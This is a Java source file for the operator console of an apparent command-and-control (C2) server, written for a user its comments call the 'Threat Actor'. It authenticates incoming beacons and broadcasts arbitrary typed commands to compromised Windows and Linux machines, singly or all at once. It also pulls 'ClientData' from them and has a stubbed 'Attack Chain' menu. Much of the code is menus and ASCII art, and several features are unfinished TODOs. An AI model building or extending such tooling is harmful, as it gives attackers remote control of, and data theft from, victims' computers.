package Servers.C2;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Scanner;

public class C2ServerUserHandler implements Runnable{
    private String RED = "\u001B[31m";
    private String BLUE = "\u001B[34m";
    private String RESET = "\u001B[37m";

    // Pointer back to the C2 Server
    private C2Server C2server;

    // Scanner for the user to enter input
    private Scanner userInputScanner;

    // Hashed Password for authentication betwen the Server and the Beacon
    private String passwordDigest;

    // This is a Hash Map of Long Range Beacons that are waiting for MFA.
    // The Key is the IP Address of the Beacon, and the Value is it's status,
    // "Waiting", "Approved", or "Denied"
    private HashMap<String,String> beaconsWaitingForMFA;

    // The User's current Path in the CLI
    private String currentUserPath;

    /**
     * Class to handle input from the user controlling the C2
     * and send it back to the C2 Server.
     * 
     * @param server Pointer to the C2 Server
     */
    protected C2ServerUserHandler(C2Server server){
        this.C2server = server;
        this.userInputScanner = new Scanner(System.in);
        this.passwordDigest = null;
        this.beaconsWaitingForMFA = new HashMap<>();
        this.currentUserPath = "";
    }

    /**
     * This function authenticates new beacons. First, the Password Hash from the Beacon
     * is compared to the password hash stored. If they match, then the user is prompted
     * through the CLI to confirm the authentication.
     * 
     * @param enteredPasswordHash the hashed password from the Beacon Server
     * @param IPAddress The IP Address of the Beacon attempting to connect
     * @return Either 'Authentication Successful', 'Authentication Failed: Incorrect Password', 'Authentication 
     * Failed: User Denied MFA Prompt', or 'Authentication Failed: Authentication Process could not be completed'
     */
    protected String authenticateToC2(String enteredPasswordHash, String IPAddress){
        if(enteredPasswordHash.equals(passwordDigest)){
            beaconsWaitingForMFA.put(IPAddress, "Waiting");
        } else{
            return "Authentication Failed: Incorrect Password";
        }

        try{
            synchronized(beaconsWaitingForMFA){
                beaconsWaitingForMFA.wait();
                if(beaconsWaitingForMFA.get(IPAddress).equals("Approved")){
                    beaconsWaitingForMFA.remove(IPAddress);
                    return "Authentication Successful";
                }else{
                    beaconsWaitingForMFA.remove(IPAddress);
                    return "Authentication Failed: User Denied MFA Prompt";
                }
            }
            
        }catch(InterruptedException e){
            e.printStackTrace();
        }
        return "Authentication Failed: Authentication Process could not be completed";
        
    }

    /**
     * Used by the C2 Server to output a message to the CLI for the Threat Actor to View
     * 
     * @param message Message to be displayed
     */
    protected void outputToCLI(String message){
        System.out.println(message);
    }

    private void printHome(){
        System.out.println(RESET);
        System.out.println("      _..---^---.._         __    __                                                      ");
        System.out.println("     /  /  /   \\ \\ \\       |  |  |  |                                   ");
        System.out.println("    /__/__/_____\\_\\_\\      |  |  |  |   ______    _________    _______                       ");
        System.out.println("   |   _ _           |     |  |__|  |  |  __  |  |  _   _  |  |  _____|              ");
        System.out.println("   |  |_|_|    __    |     |   __   |  | |  | |  | | | | | |  | |____                         ");
        System.out.println("   |  |_|_|   | .|   |     |  |  |  |  | |__| |  | | | | | |  | |_____                       ");
        System.out.println("   |__________|__|___|     |__|  |__|  |______|  |_| |_| |_|  |_______|                                                      ");
        System.out.println();
    }

    private void printCommand(){
        System.out.println(RESET);
        System.out.println("       ____                          _________                         __           ");
        System.out.println("       \\   \\                        |   ______|                       |  |             ");
        System.out.println("        \\   \\                       |  |           _________     _____|  |             ");
        System.out.println("         \\   \\                      |  |          |  _   _  |   |   __   |                ");
        System.out.println("         /   /                      |  |          | | | | | |   |  |  |  |                 ");
        System.out.println("        /   /      __________       |  |______    | | | | | |   |  |__|  |                 ");
        System.out.println("       /___/      |__________|      |_________|   |_| |_| |_|   |________|            ");
        System.out.println();
    }

    private void printAttackChain(){
        // TODO: Ascii Art for the attack chain
    }

    /**
     * This Function is used by the CLI for the user to send commands to clients
     * 
     * @param OS the Operating System 'Windows' or 'Linux'
     */
    private void sendCommand(String OS){
        String color = "";
        if(OS == "Windows"){
            color = BLUE;
            System.out.println(color);
            System.out.println("      _______ _______     __    __    __    __                         ___           ");
            System.out.println("     /      //      /    |  |  |  |  |  |  |__|   __                  |   |   _________    __          __   _________");
            System.out.println("    /      //      /     |  |  |  |  |  |   __   |  |______    _______|   |  |   ___   |  |  |   __   |  | |  _______|");
            System.out.println("   /_____ //______/      |  |  |  |  |  |  |  |  |   ___   |  |    ___    |  |  |   |  |  |  |  |  |  |  | | |_______  "); 
            System.out.println("  /      //      /       |  |  |  |  |  |  |  |  |  |   |  |  |   |   |   |  |  |   |  |  |  |  |  |  |  | |______   |        ");
            System.out.println(" /      //      /        |  |__|  |__|  |  |  |  |  |   |  |  |   |___|   |  |  |___|  |  |  |__|  |__|  |  ______|  | ");
            System.out.println("/_____ //______/         |______________|  |__|  |__|   |__|  |___________|  |_________|  |______________| |_________|          ");
            System.out.println();
        }
        if(OS == "Linux"){
            color = RED;
            System.out.flush();
            System.out.println(color);
            System.out.println("     .-------.           ___           __                            ");
            System.out.println("    /  o_o   |          |   |         |__|   __                            ");
            System.out.println("    |  :_/   |          |   |          __   |  |______    __    __   __    __ ");
            System.out.println("   //        \\\\         |   |         |  |  |   ___   |  |  |  |  |  \\ \\  / /            "); 
            System.out.println("   (|        | )        |   |         |  |  |  |   |  |  |  |  |  |   \\ \\/ /                   ");
            System.out.println("  /'\\_     _/`\\         |   |______   |  |  |  |   |  |  |  |__|  |   / /\\ \\                   ");
            System.out.println("  \\____)=(_____/        |__________|  |__|  |__|   |__|  |________|  /_/  \\_\\             ");
            System.out.println();
        }
        System.out.println("1. Send a command to ALL " + OS + " Computers");
        System.out.println("2. Send a command to A SPECIFIC " + OS + " Computer");
        System.out.println("3. Back");
        System.out.println(RESET);
        System.out.print(currentUserPath + " >> ");
        String userInput = userInputScanner.nextLine();
        if(userInput.equals("1")){
            currentUserPath += " All";
        } else if(userInput.equals("2")){
            System.out.print("Enter IP Address of desired target >> ");
            String IPAddress = userInputScanner.nextLine();
            currentUserPath += " " + IPAddress;
        } else if(userInput.equals("3")){
            currentUserPath = "Command";
        } else {
            System.out.println("Invalid Input");
        }

        if(userInput.equals("1") || userInput.equals("2")){
            System.out.print("Enter Command to be run >> ");
            String finalCommand = currentUserPath + " " + userInputScanner.nextLine();
            C2server.broadcastToBeacons(finalCommand);
            currentUserPath = "Command " + OS;
        }
        System.out.println(RESET);
    }

    private void waitForResponse() throws InterruptedException{
        System.out.println();
        System.out.println("Waiting for response...");
        Thread.sleep(5000);
    }

    @Override
    public void run() {
        // User enters password that will be used for authentication
        String password1 = "";
        String password2 = "a";
        while(!(password1.equals(password2))){
            System.out.print("Enter Password for authentication: ");
            password1 = userInputScanner.nextLine();
            System.out.print("Re-enter Password: ");
            password2 = userInputScanner.nextLine();
            if(!(password1.equals(password2))){
                System.out.println("Passwords do not match");
            }
        }

        // This password is then hashed and stored
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password1.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        // Loop for the User to use the CLI
        String userInput = "";
        while(true){
            // If there are any beacons waiting for MFA, prompt user if they should be allowed to connect.
            synchronized(beaconsWaitingForMFA){
                if(beaconsWaitingForMFA.size() > 0){
                    for(String IPAddress : beaconsWaitingForMFA.keySet()){
                        System.out.print("New Beacon Entered Password Correctly from " + IPAddress + ". Allow connection to C2 Server? (y/n) ");
                        if(userInputScanner.nextLine().toLowerCase().equals("y")){
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Approved");
                        }else{
                            beaconsWaitingForMFA.replace(IPAddress, "Waiting", "Denied");
                        }
                    }
                    beaconsWaitingForMFA.notifyAll();
                }
            }
            
            if(currentUserPath.equals("")){
                printHome();
                System.out.println("1. Send a command to all Clients");
                System.out.println("2. Launch an Attack Chain");
                System.out.println("3. Request Data from Clients");
                System.out.println("4. Exit CLI / Close Servers");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath = "Command";
                } else if(userInput.equals("2")){
                    currentUserPath = "AttackChain";
                } else if(userInput.equals("3")){
                    currentUserPath = "Request";
                } else if(userInput.equals("4")){
                    System.out.println(RED + "Closing Server..."+ RESET);
                    System.out.println();
                    C2server.stopServer();
                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
                        beaconHandler.sendToBeacon("quit");
                    }
                    break;
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command")){
                printCommand();
                System.out.println("1. Send a command to " + BLUE + "Windows" + RESET + " Computers");
                System.out.println("2. Send a command to " + RED + "Linux" + RESET + " Computers");
                System.out.println("3. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    currentUserPath += " Windows";
                    sendCommand("Windows");
                } else if(userInput.equals("2")){
                    currentUserPath += " Linux";
                    sendCommand("Linux");
                } else if(userInput.equals("3")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Command Windows")){
                sendCommand("Windows");
            } else if(currentUserPath.equals("Command Linux")){
                sendCommand("Linux");
            } else if(currentUserPath.equals("AttackChain")){
                printAttackChain();
                System.out.println("1. THE GOOSE");
                System.out.println("2. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    // TODO: Figure out how to launch the goose.
                } else if (userInput.equals("2")){
                    currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            } else if(currentUserPath.equals("Request")){
                printAttackChain();
                System.out.println("1. Request from ALL Windows Clients");
                System.out.println("2. Request from ALL Linux Clients");
                System.out.println("3. Request from single IP Address");
                System.out.println("4. Back");
                System.out.println();
                System.out.print(currentUserPath + " >> ");
                userInput = userInputScanner.nextLine();
                if(userInput.equals("1")){
                    String OS = "Windows";
                    // TO DO figure out how to send request to beacon server
                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
                    }
                    try {
                        waitForResponse();
                    } catch (InterruptedException e) {e.printStackTrace();}
                } else if (userInput.equals("2")){
                    String OS = "Linux";
                    // TO DO figure out how to send request to beacon server
                    for (C2ServerBeaconHandler beaconHandler : C2server.longRangeBeacons.values()){
                        beaconHandler.sendToBeacon("Request ClientData "+ OS +" All");
                    }
                    try {
                        waitForResponse();
                    } catch (InterruptedException e) {e.printStackTrace();}
                } else if (userInput.equals("3")){
                    System.out.print("Enter IP Address for desired request >> ");
                    String IPAddress = userInputScanner.nextLine();
                    // TODO figure out how to send request to beacon server
                } else if (userInput.equals("4")){
                        currentUserPath = "";
                } else {
                    System.out.println("Invalid Input");
                }
            }
        }
    }
}

